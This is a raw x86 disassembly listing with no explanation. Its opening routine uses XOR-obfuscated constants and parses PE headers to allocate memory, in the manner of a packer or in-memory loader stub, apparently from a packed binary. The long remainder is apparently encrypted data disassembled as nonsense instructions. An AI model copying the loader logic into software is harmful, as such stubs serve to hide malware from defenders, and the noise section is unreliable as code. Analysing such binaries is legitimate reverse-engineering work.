  41c693:	xor    eax,edi
  41c695:	mov    esi,0x3272e0
  41c69a:	add    eax,esi
  41c69c:	mov    DWORD PTR [ecx],eax
  41c69e:	mov    eax,DWORD PTR [esp+0xc]
  41c6a2:	mov    eax,DWORD PTR [eax+0x194]
  41c6a8:	mov    ecx,DWORD PTR [eax]
  41c6aa:	mov    eax,DWORD PTR [esp+0xc]
  41c6ae:	mov    eax,DWORD PTR [eax+0x194]
  41c6b4:	mov    eax,DWORD PTR [eax]
  41c6b6:	add    eax,DWORD PTR [ecx+0x3c]
  41c6b9:	mov    ecx,DWORD PTR [esp+0xc]
  41c6bd:	mov    ecx,DWORD PTR [ecx+0x1d8]
  41c6c3:	mov    ecx,DWORD PTR [ecx+0x14]
  41c6c6:	push   0x4
  41c6c8:	push   0x3000
  41c6cd:	push   DWORD PTR [eax+0x50]
  41c6d0:	push   0x0
  41c6d2:	call   ecx
  41c6d4:	mov    DWORD PTR [ebx],eax
  41c6d6:	mov    eax,DWORD PTR [esp+0x10]
  41c6da:	push   DWORD PTR [esp+0xc]
  41c6de:	xor    eax,edi
  41c6e0:	add    eax,esi
  41c6e2:	mov    DWORD PTR [esp+0x20],eax
  41c6e6:	lea    eax,[esp+0x20]
  41c6ea:	push   eax
  41c6eb:	push   ebx
  41c6ec:	push   DWORD PTR [esp+0x20]
  41c6f0:	push   DWORD PTR [esp+0x28]
  41c6f4:	push   DWORD PTR [esp+0x24]
  41c6f8:	call   0x41c0bc
  41c6fd:	mov    eax,DWORD PTR [esp+0x10]
  41c701:	mov    ecx,DWORD PTR [ebx]
  41c703:	xor    eax,edi
  41c705:	add    eax,esi
  41c707:	cmp    ecx,eax
  41c709:	je     0x41c767
  41c70b:	mov    eax,DWORD PTR [esp+0x18]
  41c70f:	mov    ecx,DWORD PTR [esp+0x14]
  41c713:	xor    eax,edi
  41c715:	add    eax,esi
  41c717:	imul   eax,DWORD PTR [esp+0x1c]
  41c71c:	mov    DWORD PTR [ecx],eax
  41c71e:	jmp    0x41c767
  41c720:	mov    ecx,DWORD PTR [ebp+0x20]
  41c723:	cmp    ecx,0xf89c85bd
  41c729:	jne    0x41c732
  41c72b:	push   0xf89c85bc
  41c730:	jmp    0x41c750
  41c732:	mov    ecx,DWORD PTR [ebp+0x20]
  41c735:	cmp    ecx,0xf89c85bc
  41c73b:	jne    0x41c744
  41c73d:	push   0xf89c85bf
  41c742:	jmp    0x41c750
  41c744:	mov    ecx,DWORD PTR [ebp+0x20]
  41c747:	cmp    ecx,0xf89c85bf
  41c74d:	jne    0x41c767
  41c74f:	push   eax
  41c750:	push   DWORD PTR [ebp+0x1c]
  41c753:	push   DWORD PTR [ebp+0x18]
  41c756:	push   ebx
  41c757:	push   DWORD PTR [ebp+0x10]
  41c75a:	push   DWORD PTR [ebp+0xc]
  41c75d:	push   DWORD PTR [ebp+0x8]
  41c760:	call   0x41c5fb
  41c765:	mov    DWORD PTR [ebx],eax
  41c767:	mov    eax,DWORD PTR [ebx]
  41c769:	pop    edi
  41c76a:	pop    esi
  41c76b:	pop    ebx
  41c76c:	mov    esp,ebp
  41c76e:	pop    ebp
  41c76f:	ret    0x1c
  41c772:	push   ebp
  41c773:	mov    ebp,esp
  41c775:	sub    esp,0xc
  41c778:	mov    eax,0xf89c85b9
  41c77d:	mov    DWORD PTR [ebp-0x8],eax
  41c780:	mov    DWORD PTR [ebp-0xc],0xf89c85b8
  41c787:	mov    ecx,DWORD PTR [ebp-0x8]
  41c78a:	xor    ecx,0x7510899
  41c790:	add    ecx,0x3272e0
  41c796:	mov    DWORD PTR [ebp-0x4],ecx
  41c799:	mov    ecx,DWORD PTR [ebp+0xc]
  41c79c:	push   eax
  41c79d:	mov    DWORD PTR [ebp+0xc],ecx
  41c7a0:	push   DWORD PTR [ebp+0xc]
  41c7a3:	lea    eax,[ebp-0x4]
  41c7a6:	push   DWORD PTR [ebp+0x8]
  41c7a9:	push   eax
  41c7aa:	push   DWORD PTR [ebp+0xc]
  41c7ad:	push   DWORD PTR [ebp-0xc]
  41c7b0:	push   DWORD PTR [ebp-0x8]
  41c7b3:	call   0x41c5fb
  41c7b8:	mov    DWORD PTR [ebp-0x4],eax
  41c7bb:	mov    eax,DWORD PTR [ebp-0x4]
  41c7be:	leave  
  41c7bf:	ret    0x8
  41c7c2:	jg     0x41c778
  41c7c4:	jge    0xf7418799
  41c7ca:	xor    BYTE PTR [ebp-0x780c6e92],0x1b
  41c7d1:	lods   al,BYTE PTR ds:[esi]
  41c7d2:	ds aas 
  41c7d4:	add    DWORD PTR [eax],eax
  41c7d6:	add    eax,DWORD PTR es:[eax]
  41c7d9:	add    BYTE PTR [edx-0x60],dh
  41c7dc:	fcomip st,st(3)
  41c7de:	xor    BYTE PTR ds:0x5106ebcf,0x4b
  41c7e5:	and    cl,ch
  41c7e7:	push   esi
  41c7e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c7e9:	dec    edx
  41c7ea:	xor    BYTE PTR [edi-0x28072538],cl
  41c7f0:	das    
  41c7f1:	pop    ds
  41c7f2:	js     0x41c85f
  41c7f4:	adc    al,0xe6
  41c7f6:	adc    DWORD PTR [ebp-0x33],esi
  41c7f9:	not    edx
  41c7fb:	sub    ebx,0xffffffe4
  41c7fe:	imul   edx,DWORD PTR [edx-0x6a8e2000],0xf9c4802c
  41c808:	mov    eax,0xc31b751
  41c80d:	aam    0xce
  41c80f:	or     BYTE PTR [esi],al
  41c811:	call   0x2e82364
  41c816:	and    al,BYTE PTR [ebp+0x14]
  41c819:	test   DWORD PTR [ebx],ebx
  41c81b:	std    
  41c81c:	pop    eax
  41c81d:	test   DWORD PTR [esp+esi*1-0x7f],ebp
  41c821:	inc    edx
  41c822:	cmp    DWORD PTR [esi+eiz*8-0x32caf2b2],esi
  41c829:	icebp  
  41c82a:	stc    
  41c82b:	leave  
  41c82c:	fbld   TBYTE PTR [ecx+ecx*8+0x1a97a315]
  41c833:	stos   DWORD PTR es:[edi],eax
  41c834:	add    DWORD PTR [esi+0x121f8360],ebp
  41c83a:	repz push edi
  41c83c:	adc    ah,dh
  41c83e:	in     eax,0x62
  41c840:	xor    eax,0xaba8ac51
  41c845:	xchg   DWORD PTR [ebp+0x1a122a04],eax
  41c84b:	mov    ds:0x4efb91e1,eax
  41c850:	dec    esi
  41c851:	test   DWORD PTR [esi+eax*4+0x7ef1bc2],ecx
  41c858:	xbegin 0x6c8276e6
  41c85e:	add    ebx,DWORD PTR [ecx]
  41c860:	hlt    
  41c861:	fld    DWORD PTR [eax+0x6c]
  41c864:	push   ds
  41c865:	xchg   esi,eax
  41c866:	cwde   
  41c867:	not    DWORD PTR [ecx]
  41c869:	stos   BYTE PTR es:[edi],al
  41c86a:	test   eax,0xb858bff0
  41c86f:	nop
  41c870:	sub    bh,al
  41c872:	and    al,BYTE PTR [esi+0x2e03f42d]
  41c878:	cmp    bl,BYTE PTR [ebx-0xc]
  41c87b:	in     eax,dx
  41c87c:	and    ebx,DWORD PTR [eax]
  41c87e:	bound  ebp,QWORD PTR [edi+0x45]
  41c881:	sbb    al,0xe
  41c883:	ret    
  41c884:	(bad)  
  41c885:	js     0x41c8ed
  41c887:	pop    ecx
  41c888:	pushf  
  41c889:	jmp    0x387e774b
  41c88e:	clc    
  41c88f:	xor    ecx,esp
  41c891:	sub    eax,0x86ebd98c
  41c896:	push   esp
  41c897:	mov    bh,0xd9
  41c899:	dec    eax
  41c89a:	xchg   BYTE PTR [eax+0x27],bl
  41c89d:	mov    ecx,0x4e01c333
  41c8a2:	or     BYTE PTR ds:0x5394d6bc,ah
  41c8a8:	es jle 0x41c8cd
  41c8ab:	add    eax,DWORD PTR [eax-0x20c24947]
  41c8b1:	lea    ecx,[bx+si]
  41c8b4:	or     ch,BYTE PTR [edi+0x13f3b3ab]
  41c8ba:	mov    esp,0x4cf77b82
  41c8bf:	shl    BYTE PTR [edx+ebx*4+0x46b7581e],cl
  41c8c6:	out    dx,eax
  41c8c7:	(bad)  
  41c8c8:	into   
  41c8c9:	scas   eax,DWORD PTR es:[edi]
  41c8ca:	jmp    0x16dc746e
  41c8cf:	out    0xe8,eax
  41c8d1:	outs   dx,BYTE PTR ds:[esi]
  41c8d2:	js     0x41c891
  41c8d4:	mov    esi,gs
  41c8d6:	inc    ebp
  41c8d7:	ds mov ebx,0x356ead86
  41c8dd:	mov    bh,0x81
  41c8df:	sahf   
  41c8e0:	(bad)  
  41c8e1:	retf   
  41c8e2:	lods   eax,DWORD PTR ds:[esi]
  41c8e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c8e4:	push   esi
  41c8e5:	mov    ebp,0x446ab014
  41c8ea:	bound  eax,QWORD PTR ds:0x240c62d
  41c8f0:	out    dx,al
  41c8f1:	dec    esp
  41c8f2:	sub    bh,ah
  41c8f4:	fisttp DWORD PTR [ebp*4-0xe258696]
  41c8fb:	out    0x58,al
  41c8fd:	fild   QWORD PTR [ebp+0x3b]
  41c900:	out    dx,eax
  41c901:	pop    eax
  41c902:	into   
  41c903:	jmp    DWORD PTR [esi-0x33]
  41c906:	jno    0x41c89d
  41c908:	lea    edi,[ecx]
  41c90a:	jl     0x41c988
  41c90c:	inc    ecx
  41c90d:	iret   
  41c90e:	xor    eax,0x3e1bcd0b
  41c913:	popa   
  41c914:	xchg   ecx,eax
  41c915:	les    ebp,FWORD PTR [esi]
  41c917:	mov    ebp,?
  41c919:	loope  0x41c939
  41c91b:	ret    0x3b47
  41c91e:	mov    ecx,DWORD PTR [edi+0x7f4c637]
  41c924:	popf   
  41c925:	popa   
  41c926:	outs   dx,DWORD PTR ds:[esi]
  41c927:	push   edi
  41c928:	aas    
  41c929:	push   esp
  41c92a:	pusha  
  41c92b:	repnz repnz xchg edi,eax
  41c92e:	in     eax,0xc9
  41c930:	jecxz  0x41c941
  41c932:	cmp    BYTE PTR [eax],dl
  41c934:	lods   al,BYTE PTR ds:[esi]
  41c935:	ins    DWORD PTR es:[edi],dx
  41c936:	imul   esi,eax,0x33d52785
  41c93c:	jns    0x41c8c1
  41c93e:	dec    esp
  41c93f:	imul   ebx,DWORD PTR [eax],0x19778f8f
  41c945:	daa    
  41c946:	cmp    BYTE PTR [ecx-0x32],bh
  41c949:	es jg  0x41c9c1
  41c94c:	aas    
  41c94d:	cmp    al,0xa
  41c94f:	mov    edi,0x91c89607
  41c954:	jo     0x41c994
  41c956:	test   ecx,esp
  41c958:	cli    
  41c959:	mov    es,WORD PTR [ecx]
  41c95b:	aas    
  41c95c:	mov    WORD PTR [edi-0x51],fs
  41c95f:	jae    0x41c9c8
  41c961:	jge    0x41c963
  41c963:	out    dx,eax
  41c964:	je     0x41c8eb
  41c966:	dec    edx
  41c967:	adc    ebx,ecx
  41c969:	dec    esi
  41c96a:	fnstsw WORD PTR [ebx+0x4f]
  41c96d:	pushf  
  41c96e:	cld    
  41c96f:	in     eax,0xa8
  41c971:	pop    ss
  41c972:	cdq    
  41c973:	pop    eax
  41c974:	jnp    0x41c977
  41c976:	add    BYTE PTR ds:0x51a28809,cl
  41c97c:	xchg   edx,eax
  41c97d:	inc    ebp
  41c97e:	xchg   esi,eax
  41c97f:	or     eax,0x9c3b8213
  41c984:	cmp    DWORD PTR [esp+eiz*8-0x54],eax
  41c988:	inc    eax
  41c989:	cmp    eax,0xe866d5ed
  41c98e:	sub    ah,BYTE PTR [esi]
  41c990:	or     DWORD PTR ds:0x2f145fd0,ebx
  41c996:	pop    ecx
  41c997:	ss je  0x41c96d
  41c99a:	inc    esp
  41c99b:	xchg   BYTE PTR ds:0x558e379a,ah
  41c9a1:	xchg   esp,eax
  41c9a2:	xor    BYTE PTR [edx],ah
  41c9a4:	xor    DWORD PTR [eax],ebx
  41c9a6:	xchg   ebx,eax
  41c9a7:	(bad)  
  41c9a8:	mov    dh,0x66
  41c9aa:	jno    0x41ca29
  41c9ac:	mov    eax,ds:0x17657aec
  41c9b1:	call   FWORD PTR [edi+edx*1+0x36458f01]
  41c9b8:	dec    esi
  41c9b9:	hlt    
  41c9ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9bb:	scas   al,BYTE PTR es:[edi]
  41c9bc:	mov    esi,0xa2ed382a
  41c9c1:	out    0xf4,al
  41c9c3:	mov    ebp,0x4a6af10a
  41c9c8:	sbb    ch,BYTE PTR [ebx-0x1440a780]
  41c9ce:	(bad)  
  41c9cf:	imul   ebx,DWORD PTR [edi],0x1b
  41c9d2:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  41c9d4:	pop    eax
  41c9d5:	xchg   ebx,eax
  41c9d6:	add    DWORD PTR [ebx+0x26],esp
  41c9d9:	mov    WORD PTR [ebp+edx*8+0x79ea2678],gs
  41c9e0:	mov    edx,0xed8e98cc
  41c9e5:	je     0x41ca24
  41c9e7:	xor    DWORD PTR [eax+0x1d73b4b],0x15
  41c9ee:	ficomp WORD PTR [esi-0x29]
  41c9f1:	mov    ah,0x95
  41c9f3:	dec    ebp
  41c9f4:	mov    esp,0xf05d1f72
  41c9f9:	adc    eax,edi
  41c9fb:	xchg   esp,ebx
  41c9fd:	std    
  41c9fe:	push   esi
  41c9ff:	inc    ebp
  41ca00:	ret    
  41ca01:	out    0xc8,eax
  41ca03:	jb     0x41ca5d
  41ca05:	or     esp,DWORD PTR [ecx]
  41ca07:	pop    ebx
  41ca08:	jle    0x41ca01
  41ca0a:	adc    al,0x19
  41ca0c:	mov    ecx,0xbd37c46f
  41ca11:	or     BYTE PTR [edx],bl
  41ca13:	fnsave [ecx+0x84a3f2f]
  41ca19:	push   ebp
  41ca1a:	rdtsc  
  41ca1c:	int3   
  41ca1d:	hlt    
  41ca1e:	mov    BYTE PTR [ebx],0xf9
  41ca21:	mov    ah,ah
  41ca23:	mov    al,ds:0x319a081
  41ca28:	cli    
  41ca29:	jae    0x41ca15
  41ca2b:	pop    esp
  41ca2c:	mov    ds:0x42869f2e,eax
  41ca31:	scas   eax,DWORD PTR es:[edi]
  41ca32:	push   eax
  41ca33:	jecxz  0x41ca23
  41ca35:	ficomp WORD PTR [ebx+0x34]
  41ca38:	pop    eax
  41ca39:	xchg   edi,eax
  41ca3a:	(bad)  
  41ca3b:	and    BYTE PTR [edx],ch
  41ca3d:	or     al,0xc
  41ca3f:	push   0x8406db58
  41ca44:	ds jns 0x41ca7a
  41ca47:	or     DWORD PTR [ecx-0x1a955e76],ebx
  41ca4d:	out    dx,eax
  41ca4e:	mov    ds:0xc4a52d26,al
  41ca53:	add    al,0x76
  41ca55:	ret    
  41ca56:	jl     0x41cacf
  41ca58:	jo     0x41c9dc
  41ca5a:	in     eax,dx
  41ca5b:	xlat   BYTE PTR ds:[ebx]
  41ca5c:	fdivrp st(5),st
  41ca5e:	jns    0x41c9ff
  41ca60:	pop    edi
  41ca61:	mov    dl,cl
  41ca63:	and    BYTE PTR [edi-0x36],bl
  41ca66:	ja     0x41cac6
  41ca68:	dec    edx
  41ca69:	jl     0x41ca82
  41ca6b:	mov    al,BYTE PTR [edx]
  41ca6d:	xchg   esp,eax
  41ca6e:	mov    esi,0x27feea70
  41ca73:	jo     0x41ca3d
  41ca75:	fldcw  WORD PTR [eax]
  41ca77:	xchg   edi,eax
  41ca78:	add    DWORD PTR [eax-0xaaf667],edi
  41ca7e:	mov    ch,0x87
  41ca80:	sar    BYTE PTR ds:0x32332dd0,1
  41ca86:	stos   BYTE PTR es:[edi],al
  41ca87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca88:	leave  
  41ca89:	or     dl,cl
  41ca8b:	and    ecx,ebx
  41ca8d:	xor    DWORD PTR [edx-0x56],ebx
  41ca90:	xor    DWORD PTR [edx],ecx
  41ca92:	(bad)  
  41ca93:	adc    BYTE PTR [ebp-0x304ab2eb],cl
  41ca99:	data16 cmp al,0xcd
  41ca9c:	mov    esp,0x848b446f
  41caa1:	push   ebp
  41caa2:	(bad)  
  41caa4:	xlat   BYTE PTR ds:[ebx]
  41caa5:	mov    eax,0x55a7a7c2
  41caaa:	ret    0x59b6
  41caad:	mov    bl,0x21
  41caaf:	(bad)  
  41cab2:	inc    DWORD PTR [ecx-0x439f2f0c]
  41cab8:	cmc    
  41cab9:	fdivr  QWORD PTR [ecx-0x58]
  41cabc:	pop    ebx
  41cabd:	mov    ecx,0xc6dd7e81
  41cac2:	or     esp,ebx
  41cac4:	mov    edx,0xddf6f60d
  41cac9:	sbb    BYTE PTR [ebp+esi*1-0x18856c67],bh
  41cad0:	xor    esp,DWORD PTR [ebp+0xa]
  41cad3:	std    
  41cad4:	inc    ebp
  41cad5:	or     eax,0x69c87fe2
  41cada:	dec    esi
  41cadb:	test   DWORD PTR [ebp-0x7ba90bdf],0xdf1b81f7
  41cae5:	push   ss
  41cae6:	xor    BYTE PTR [edi+0x19],0x7b
  41caea:	sub    esp,DWORD PTR [edx+0x8]
  41caed:	das    
  41caee:	sub    al,BYTE PTR [ecx]
  41caf0:	bound  ebp,QWORD PTR [ebp+0xf]
  41caf3:	or     eax,0x3f79a50b
  41caf8:	ror    BYTE PTR [ebx-0x40],0x36
  41cafc:	jnp    0x41cb69
  41cafe:	pop    ebx
  41caff:	rol    DWORD PTR [eax],1
  41cb01:	add    BYTE PTR [edi+0x4c],dh
  41cb04:	idiv   dh
  41cb06:	(bad)  
  41cb07:	(bad)  
  41cb08:	jg     0x41cad7
  41cb0a:	mov    ah,0x6b
  41cb0c:	mov    dh,0x14
  41cb0e:	pop    ds
  41cb0f:	add    cl,BYTE PTR [ecx+0x1]
  41cb12:	fs inc edx
  41cb14:	add    DWORD PTR [eax],eax
  41cb16:	add    eax,DWORD PTR es:[eax]
  41cb19:	add    BYTE PTR [ecx+0x37],bl
  41cb1c:	cmc    
  41cb1d:	jle    0x41cae9
  41cb1f:	gs scas al,BYTE PTR es:[edi]
  41cb21:	(bad)  
  41cb22:	stos   DWORD PTR es:[edi],eax
  41cb23:	add    dl,ah
  41cb25:	sbb    ch,al
  41cb27:	inc    ecx
  41cb28:	outs   dx,DWORD PTR ds:[esi]
  41cb29:	jmp    0x51c1:0xe0cc0d5
  41cb30:	jbe    0x41cbae
  41cb32:	cmp    DWORD PTR ds:0x81d7ff70,eax
  41cb38:	xor    al,bh
  41cb3a:	test   eax,eax
  41cb3c:	sub    bh,BYTE PTR [edx]
  41cb3e:	jmp    0x29a7a9cc
  41cb43:	sbb    DWORD PTR [ecx-0x5],edi
  41cb46:	jg     0x41cb92
  41cb48:	push   es
  41cb49:	mov    dl,0x60
  41cb4b:	mov    ebx,DWORD PTR [ecx-0x70fb5c6b]
  41cb51:	sbb    ah,BYTE PTR [eax]
  41cb53:	add    BYTE PTR [eax+edi*8],bh
  41cb56:	and    al,BYTE PTR [ebx-0x12]
  41cb59:	dec    ebp
  41cb5a:	lea    ebx,[eax]
  41cb5c:	mov    edx,0x23947c20
  41cb61:	imul   DWORD PTR [edi-0x80]
  41cb64:	mov    ds:0xd2d1ddd7,al
  41cb69:	sub    esi,0x11
  41cb6c:	nop    DWORD PTR [edi]
  41cb6f:	test   BYTE PTR [edi-0x3781afd8],ch
  41cb75:	adc    ebx,esi
  41cb77:	out    0x9e,al
  41cb79:	lock in al,dx
  41cb7b:	in     al,0x8b
  41cb7d:	mov    cl,0xbe
  41cb7f:	xor    eax,0x6ce4971a
  41cb84:	mov    dl,BYTE PTR [eax]
  41cb86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb87:	xor    DWORD PTR [eax-0x7c],ebp
  41cb8a:	jne    0x41cbf6
  41cb8c:	pop    edi
  41cb8d:	std    
  41cb8e:	adc    cl,BYTE PTR [ebx-0x2d]
  41cb91:	adc    dl,BYTE PTR [edi+0xd971238]
  41cb97:	push   es
  41cb98:	or     ebp,DWORD PTR [esi]
  41cb9a:	mov    edx,gs
  41cb9c:	xor    edx,DWORD PTR [edx-0x4d16e3ea]
  41cba2:	add    edx,DWORD PTR [ebp+0x3cb50e8f]
  41cba8:	repz mov ds:0xa7a3a26a,eax
  41cbae:	shr    DWORD PTR [esi-0x519acc72],1
  41cbb4:	push   ds
  41cbb5:	lods   eax,DWORD PTR ds:[esi]
  41cbb6:	push   ss
  41cbb7:	nop
  41cbb8:	xchg   edx,eax
  41cbb9:	ins    BYTE PTR es:[edi],dx
  41cbba:	out    0xd7,eax
  41cbbc:	mov    WORD PTR [ecx-0x445dc4ef],cs
  41cbc2:	ins    BYTE PTR es:[edi],dx
  41cbc3:	fdivr  DWORD PTR [edx+edi*1-0x67]
  41cbc7:	sbb    ch,BYTE PTR [edi]
  41cbc9:	rcr    al,0xa5
  41cbcc:	in     al,0x8
  41cbce:	mov    dl,0x33
  41cbd0:	push   es
  41cbd1:	and    eax,0xe9cf24b4
  41cbd6:	or     cl,bh
  41cbd8:	imul   ebp,DWORD PTR [edx-0x744323e4],0x49
  41cbdf:	mov    dl,0x5f
  41cbe1:	fst    st(2)
  41cbe3:	mov    ds:0x8264dcfd,ax
  41cbe9:	ds jle 0x41cbac
  41cbec:	out    0x6a,eax
  41cbee:	ret    
  41cbef:	xchg   esi,eax
  41cbf0:	sub    al,0x12
  41cbf2:	sub    ebx,DWORD PTR [edi+0x28]
  41cbf5:	jge    0x41cc53
  41cbf7:	push   ebx
  41cbf8:	pop    ecx
  41cbf9:	bound  edx,QWORD PTR [ebx+0x59]
  41cbfc:	aas    
  41cbfd:	imul   ebx,DWORD PTR [edx+edi*8],0x39
  41cc01:	and    al,0xb9
  41cc03:	aaa    
  41cc04:	imul   edi,DWORD PTR [edi-0x44],0xf0f47e3f
  41cc0b:	push   ebx
  41cc0c:	push   ecx
  41cc0d:	das    
  41cc0e:	ins    DWORD PTR es:[edi],dx
  41cc0f:	(bad)  
  41cc11:	push   edx
  41cc12:	shl    DWORD PTR [ebx+0x59],1
  41cc15:	jb     0x41cbea
  41cc17:	or     eax,0xc8262159
  41cc1c:	ja     0x41cbeb
  41cc1e:	dec    ecx
  41cc1f:	pop    ds
  41cc20:	popf   
  41cc21:	mov    ah,0x48
  41cc23:	cmp    BYTE PTR [eax],ah
  41cc25:	or     al,0x83
  41cc27:	aaa    
  41cc28:	cmp    eax,DWORD PTR [ebp-0x6fabe4a1]
  41cc2e:	xor    ebp,ebx
  41cc30:	cli    
  41cc31:	fisttp DWORD PTR [ebx]
  41cc33:	(bad)  
  41cc35:	stos   DWORD PTR es:[edi],eax
  41cc36:	lds    ecx,FWORD PTR es:[edi-0x6b]
  41cc3a:	test   eax,0x53d2a958
  41cc3f:	test   al,0x20
  41cc41:	lahf   
  41cc42:	in     al,0x86
  41cc44:	inc    ebx
  41cc45:	or     DWORD PTR [edi-0x3291f848],eax
  41cc4b:	jg     0x41cc8e
  41cc4d:	xor    dh,BYTE PTR [esi-0x69]
  41cc50:	(bad)  
  41cc51:	call   FWORD PTR [eax]
  41cc53:	dec    edi
  41cc54:	(bad)  
  41cc55:	xchg   esi,eax
  41cc56:	mov    BYTE PTR [eax+0x32],cl
  41cc59:	mov    WORD PTR [edi],ss
  41cc5b:	dec    ebx
  41cc5c:	aaa    
  41cc5d:	adc    eax,0x1916a329
  41cc62:	cs adc al,0xfa
  41cc65:	ins    DWORD PTR es:[edi],dx
  41cc66:	inc    esi
  41cc67:	leave  
  41cc68:	pop    eax
  41cc69:	(bad)  
  41cc6a:	cwde   
  41cc6b:	sti    
  41cc6c:	xchg   DWORD PTR [eax+eiz*1+0x65],edx
  41cc70:	dec    edx
  41cc71:	cli    
  41cc72:	cmp    BYTE PTR [eax-0x1bf2afaf],bl
  41cc78:	sbb    eax,0xdf069
  41cc7d:	cmc    
  41cc7e:	lock ss test edx,edi
  41cc82:	and    al,0x77
  41cc84:	scas   eax,DWORD PTR es:[edi]
  41cc85:	push   ss
  41cc86:	adc    edx,DWORD PTR [ebx+0x7f8c7f7e]
  41cc8c:	push   esi
  41cc8d:	jge    0x41cc62
  41cc8f:	dec    esp
  41cc90:	scas   eax,DWORD PTR es:[edi]
  41cc91:	cmp    al,BYTE PTR [edi]
  41cc93:	das    
  41cc94:	aad    0xb7
  41cc96:	jecxz  0x41cc8b
  41cc98:	pop    esi
  41cc99:	hlt    
  41cc9a:	xor    esi,esp
  41cc9c:	loop   0x41cc61
  41cc9e:	fsubr  DWORD PTR [esi+ecx*4]
  41cca1:	inc    ebp
  41cca2:	adc    esp,DWORD PTR [edx-0x2]
  41cca5:	add    DWORD PTR [ebx],edi
  41cca7:	mov    ebx,0xc2849da8
  41ccac:	dec    esi
  41ccad:	inc    esp
  41ccae:	inc    ebx
  41ccaf:	fild   DWORD PTR [edx+0x1d4187bd]
  41ccb5:	push   es
  41ccb6:	sub    dh,dh
  41ccb8:	cmp    ch,BYTE PTR [eax+0x6c7b2066]
  41ccbe:	mov    dl,0x7
  41ccc0:	mov    al,0x2b
  41ccc2:	loope  0x41cc93
  41ccc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ccc5:	pusha  
  41ccc6:	pusha  
  41ccc7:	imul   edx,DWORD PTR [ebx],0x63
  41ccca:	mov    eax,0xf24992fa
  41cccf:	xor    al,0x17
  41ccd1:	ret    0xb197
  41ccd4:	(bad)  
  41ccd5:	mov    ebx,0x804b4fb0
  41ccda:	dec    ebx
  41ccdb:	mov    esi,0xc145018b
  41cce0:	pop    ebp
  41cce1:	lods   eax,DWORD PTR ds:[esi]
  41cce2:	sub    dl,BYTE PTR [ebx]
  41cce4:	pop    ebp
  41cce5:	adc    esi,edx
  41cce7:	or     eax,DWORD PTR [ebx+0x46]
  41ccea:	shl    BYTE PTR [eax+0x29f1c537],cl
  41ccf0:	jg     0x41cd41
  41ccf2:	pop    esp
  41ccf3:	dec    ecx
  41ccf4:	jne    0x41cd04
  41ccf6:	dec    eax
  41ccf7:	and    DWORD PTR [ecx],esi
  41ccf9:	sub    bh,dl
  41ccfb:	aam    0x83
  41ccfd:	call   0x647c:0x7a68ab62
  41cd04:	dec    ebp
  41cd05:	addr16 pop es
  41cd07:	retf   
  41cd08:	not    DWORD PTR [esi+0x71]
  41cd0b:	mov    bh,0xc5
  41cd0d:	xlat   BYTE PTR ds:[ebx]
  41cd0e:	loopne 0x41ccb8
  41cd10:	push   0x30
  41cd12:	mov    bl,0x0
  41cd14:	adc    ah,bh
  41cd16:	cmc    
  41cd17:	nop
  41cd18:	sbb    bh,cl
  41cd1a:	iret   
  41cd1b:	jle    0x41ccc6
  41cd1d:	dec    edi
  41cd1e:	(bad)  
  41cd1f:	sbb    eax,0x71e9eda6
  41cd24:	inc    edi
  41cd25:	adc    BYTE PTR [ecx+0x78bf41f5],0x72
  41cd2c:	out    0x73,eax
  41cd2e:	add    BYTE PTR [eax-0x7b340343],0xcd
  41cd35:	in     al,dx
  41cd36:	jb     0x41ccdf
  41cd38:	or     eax,0x747d065
  41cd3d:	mov    ebx,0x5f690a95
  41cd42:	sbb    DWORD PTR [edi-0x31],eax
  41cd45:	jg     0x41cd9c
  41cd47:	pop    eax
  41cd48:	ins    DWORD PTR es:[edi],dx
  41cd49:	pop    eax
  41cd4a:	ja     0x41cda7
  41cd4c:	nop
  41cd4d:	dec    ebp
  41cd4e:	das    
  41cd4f:	sub    DWORD PTR [eax],0x1d
  41cd52:	adc    cl,al
  41cd54:	mov    esp,0x2d0d54e6
  41cd59:	inc    edi
  41cd5a:	imul   edx,eax,0x9568a817
  41cd60:	cmp    DWORD PTR [ebp-0x7],eax
  41cd63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd64:	push   es
  41cd65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd66:	push   esi
  41cd67:	push   cs
  41cd68:	imul   eax,ebx,0xe15f2eeb
  41cd6e:	les    ebp,FWORD PTR [edx+0x20a328a7]
  41cd74:	pop    edx
  41cd75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd76:	fild   QWORD PTR [edi-0x3837beb]
  41cd7c:	xor    eax,0xf18777f9
  41cd81:	sub    edx,DWORD PTR [edx-0x5def712c]
  41cd87:	dec    ecx
  41cd88:	mov    BYTE PTR [esi],0x7
  41cd8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd8c:	mov    ecx,0xc6006125
  41cd91:	and    DWORD PTR [ecx+0x6a],0x4f
  41cd95:	inc    ebp
  41cd96:	cdq    
  41cd97:	in     eax,0xbb
  41cd99:	loopne 0x41cd7c
  41cd9b:	out    0x88,eax
  41cd9d:	jp     0x41cd2a
  41cd9f:	gs xchg ebx,eax
  41cda1:	sbb    BYTE PTR [esi],ah
  41cda3:	test   al,0xa5
  41cda5:	lds    ebx,FWORD PTR [edi]
  41cda7:	push   ebp
  41cda8:	mov    es,WORD PTR [esi-0x52073cf4]
  41cdae:	xlat   BYTE PTR cs:[ebx]
  41cdb0:	test   DWORD PTR [edx+0x1fe829f1],edx
  41cdb6:	std    
  41cdb7:	mov    esi,0xce2baaa6
  41cdbc:	addr16 push 0x425dcf4f
  41cdc2:	retf   
  41cdc3:	jl     0x41ce02
  41cdc5:	ins    DWORD PTR es:[edi],dx
  41cdc6:	dec    edx
  41cdc7:	in     eax,0xab
  41cdc9:	and    al,0x7d
  41cdcb:	test   BYTE PTR [ecx+0x5c],bh
  41cdce:	sysenter 
  41cdd0:	dec    eax
  41cdd1:	push   es
  41cdd2:	popf   
  41cdd3:	leave  
  41cdd4:	xchg   ebx,eax
  41cdd5:	loope  0x41ce50
  41cdd7:	sub    eax,ebp
  41cdd9:	outs   dx,BYTE PTR ds:[esi]
  41cdda:	call   0x2e5d:0xccbdbcb3
  41cde1:	add    BYTE PTR [edi-0x34ed347b],dl
  41cde7:	cmc    
  41cde8:	ret    
